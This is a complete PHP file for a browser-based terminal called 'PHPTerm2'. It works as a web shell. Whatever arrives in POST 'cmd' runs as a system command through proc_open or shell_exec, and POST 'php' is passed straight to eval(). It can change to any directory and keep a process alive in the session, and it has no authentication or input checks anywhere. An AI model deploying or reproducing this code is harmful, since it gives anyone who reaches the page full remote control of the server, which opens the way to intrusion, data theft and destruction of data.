<?php 
@session_start();
function getLeft(){
	$cu = get_current_user();
	if (strlen($cu)>7) $cu = substr($cu,0,5).'..';
	$cw = '/'.getcwd();
	if ($cw[strlen($cw)-1]=='/' || $cw[strlen($cw)-1]=='\\') $cw = substr($cw,0,strlen($cw)-1);
	$cw = substr($cw,1+max(strrpos($cw,'/'),strrpos($cw,'\\')));
	if (strlen($cw)>14) $cu = substr($cu,0,12).'..';
	$extra = '';
	if (isset($_SESSION['proc'])) {
		if (function_exists('proc_get_status')) {
			$ps = proc_get_status($_SESSION['proc']);
			$extra = 'pid='.$ps['pid'];
		} else {
			$extra = 'inProc';
		}
	}
	return $cu.'['.$cw.']'.$extra.'>';
}
if (isset($_POST['cmd'])){
	header('Content-type: text/json');
	chdir($_POST['cwd']);
	$cmd = $_POST['cmd'];
	if (get_magic_quotes_gpc()) $cmd = stripslashes($cmd);
	$stdout = '';
	$superaddition = '';
	$isprocend = true;
	if (substr($cmd,0,3)=='cd ') {
		chdir(realpath(substr($cmd,3)));
	} elseif ($cmd=='_SPECIAL_RUNPHP') {
		ob_start();
		$stdout = eval($_POST['php'].';');
		$stdout .= "\n".ob_get_contents()."\n ";
		ob_end_clean();
	} elseif ($cmd=='_SPECIAL_KILL_CURRENT_PROC') {
		if (isset($_SESSION['proc']) && $_SESSION['proc']!=NULL) {
			$p = $_SESSION['proc'];
			$io = $_SESSION['io'];
			@proc_terminate($p);
			fclose($io[0]);
			fclose($io[1]);
			fclose($io[2]);
			proc_close($p);
			unset($_SESSION['proc']);
			unset($_SESSION['io']);
			$stdout = 'Killed';
		} else {
			$stdout = 'Nothing is killed';
		}
	} else 
		if(function_exists('proc_open')) {
			$issuperaddition = false;
			if (!isset($_SESSION['proc'])) {
				$p = proc_open(@$cmd,
					array(
					0 => array('pipe', 'r'),
					1 => array('pipe', 'w'),
					2 => array('pipe', 'w')), $io,getcwd());
				$_SESSION['proc'] = $p;
				$_SESSION['io'] = $io;
				stream_set_timeout($io[0],1);
				stream_set_timeout($io[1],1);
				stream_set_timeout($io[2],1);
			} else {
				$p = $_SESSION['proc'];
				$io = $_SESSION['io'];
				fwrite($io[0], $cmd."\n");
				$issuperaddition = true;
			}
			
			$timestart = time();
			/* Read output sent to stdout. */
			while (1) {
				if (feof($io[1])) break;
				$add = fgets($io[1],1024);
				if (FALSE === $add) break;
				if (0 == strlen($add)) break;
				$stdout .= $add;
				if ((time()-$timestart)>3) break;
			}
			
			$timestart = time();
			/* Read output sent to stderr. */
			while (1) {
				if (feof($io[2])) break;
				$add = fgets($io[2],1024);
				if (FALSE === $add) break;
				if (0 == strlen($add)) break;
				$stdout .= $add;
				if ((time()-$timestart)>3) break;
			}
			
			if ($issuperaddition) {
				$superaddition = $stdout;
				$stdout = '';
			}
			
			if (function_exists('proc_get_status')) {
				$ps = proc_get_status($p);
				$isprocend = !$ps['running'];
			}
			if ($isprocend) {
				fclose($io[0]);
				fclose($io[1]);
				fclose($io[2]);
				proc_close($p);
				unset($_SESSION['proc']);
				unset($_SESSION['io']);
			}
		} else {
			$stdout=shell_exec($cmd);
		}
	echo(json_encode(array('cwd'=>getcwd(),'left'=>getLeft(),'output'=>$stdout,'superaddition'=>$superaddition)));
	exit;
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>PHPTerm2</title>
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div class="topbarSpace" id="topbar">
<jar>
CWD: <span id="cwd"><?php echo getcwd() ?></span><br>
<span id="remoteerr"></span>
<br><a href="javascript:phpevalshow()">Open PHP Eval</a> | <a href="javascript:history.go(0)">Refresh Page</a> | <a href="javascript:prockill()">Kill Current Process</a></jar>
</div>
<div class="topbarSpace"></div>
<div id="output"><pre>Hello World!</pre></div>
<div id="spacer"></div>
<div id="input">
<div id="inleft" onMouseOver="txtin.focus();" onKeyDown="txtin.focus();"></div><input id="in" onkeypress="if(event.keyCode==13){inright.click();return false;}" onKeyDown="return(keydown1(event))"><input id="inright" value="Enter" type="button" onClick="send()">
</div>
<div id="phpeval" align="center">
<div class="topb1">::PHP EVAL::<a href="javascript:phpevalhide()">×</a></div>
<div align="left">&lt;?php</div>
<textarea id="phpevalin" cols="" rows=""></textarea>
<input value="Execute" type="button" onClick="phpevalrun();phpevalhide()">
</div>
<script type="text/javascript" src="js.js"></script>
</body>
</html>
